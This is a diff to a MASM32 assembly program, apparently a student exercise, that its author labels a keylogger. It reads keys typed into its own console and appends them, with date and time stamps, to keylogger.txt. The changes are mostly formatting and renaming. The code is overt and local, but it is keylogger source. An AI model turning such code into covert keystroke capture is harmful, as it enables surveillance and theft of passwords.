@@ -11,19 +11,17 @@ includelib \masm32\lib\masm32.lib
 includelib \masm32\lib\user32.lib
 
 WinMain proto :DWORD, :DWORD, :DWORD, :DWORD
-;data segment
 .data
 
 	directorio		byte "keylogger.txt",NULL
 	error1			db "No se pudo crear el archivo",0
 	inicio			db "Keylogger iniciado", 10, 0
-	formatofecha db " dd/MM/yyyy ",0
-	formatohora db " hh:mm:ss ",0
-	;continuacion	db "Presione una tecla para continaur", 10, 0
+	formatofecha	db " dd/MM/yyyy ",0
+	formatohora		db " hh:mm:ss ",0
 
 .data?
-fechaBuf db 50 dup(?)
-	horaBuf db 50 dup(?)
+	fechaAct		db 50 dup(?)
+	horaAct			db 50 dup(?)
 	manejo			dd ?
 	key				dd ?
 	bytesw			dd ?
@@ -33,38 +31,37 @@ program:
 	main PROC
 
 		INVOKE				StdOut, ADDR inicio
-		;INVOKE				StdOut, ADDR continuacion
 
 		MOV					edx, OFFSET directorio
 		
-		INVOKE CreateFile, edx, GENERIC_WRITE OR GENERIC_READ, FILE_SHARE_READ OR FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL,NULL	
-		INVOKE SetFilePointer, eax, 0, 0, FILE_END
+		INVOKE				CreateFile, edx, GENERIC_WRITE OR GENERIC_READ, FILE_SHARE_READ OR FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL,NULL	
+		INVOKE				SetFilePointer, eax, 0, 0, FILE_END
 		MOV					manejo, EAX
 		CMP					EAX, INVALID_HANDLE_VALUE
 		JE					fin_programa
-
+		JMP					EscribirFecha
 		keylogger:
 
 			CALL			crt__getch
 			MOV				key, EAX
 			CMP				EAX, 0
 			JE				seguir
-		    INVOKE CreateFile, addr directorio, GENERIC_WRITE OR GENERIC_READ, FILE_SHARE_READ OR FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL,0
-		    mov manejo, eax
-		    INVOKE SetFilePointer, manejo, 0, 0, FILE_END
-		    INVOKE WriteFile,manejo,addr key,1,addr bytesw,NULL
-		    mov eax, manejo
-		    INVOKE CloseHandle, eax
+		    INVOKE			CreateFile, addr directorio, GENERIC_WRITE OR GENERIC_READ, FILE_SHARE_READ OR FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL,0
+		    mov				manejo, eax
+		    INVOKE			SetFilePointer, manejo, 0, 0, FILE_END
+		    INVOKE			WriteFile,manejo,addr key,1,addr bytesw,NULL
+		    mov				eax, manejo
+		    INVOKE			CloseHandle, eax
 
 
 		verificacion:
 
-	    mov ebx, key						
-		cmp ebx, 20h						
-		jz EscribirFecha
-		cmp ebx,  0dh						
-		jz EscribirFecha
-		jmp keylogger			
+			mov				ebx, key						
+			cmp				ebx, 20h						
+			jz			EscribirFecha
+			cmp				ebx,  0dh						
+			jz			EscribirFecha
+			jmp				keylogger			
 
 		seguir:
 			JMP				keylogger
@@ -83,19 +80,19 @@ program:
 			JMP				verificacion
 
 		EscribirFecha:
-		   INVOKE CreateFile, addr directorio, GENERIC_WRITE OR GENERIC_READ, FILE_SHARE_READ OR FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL,0
-		mov manejo, eax
-		INVOKE SetFilePointer, manejo, 0, 0, FILE_END
+		   INVOKE			CreateFile, addr directorio, GENERIC_WRITE OR GENERIC_READ, FILE_SHARE_READ OR FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL,0
+			mov				manejo, eax
+			INVOKE			SetFilePointer, manejo, 0, 0, FILE_END
 
-		invoke GetDateFormat, 0,0, \
-		0, addr formatofecha, addr fechaBuf, 50
-		invoke GetTimeFormat, 0, 0, \
-		0, addr formatohora, addr horaBuf, 50
+			invoke			GetDateFormat, 0,0, \
+								0, addr formatofecha, addr fechaAct, 50
+			invoke			GetTimeFormat, 0, 0, \
+								0, addr formatohora, addr horaAct, 50
 
-		INVOKE WriteFile,manejo,addr fechaBuf,11,addr bytesw,NULL
-		INVOKE WriteFile,manejo,addr horaBuf,10,addr bytesw,NULL
+			INVOKE			WriteFile,manejo,addr fechaAct,11,addr bytesw,NULL
+			INVOKE			WriteFile,manejo,addr horaAct,10,addr bytesw,NULL
 
-		invoke CloseHandle, manejo
+			invoke			CloseHandle, manejo
 			JMP				seguir
 
 	main ENDP
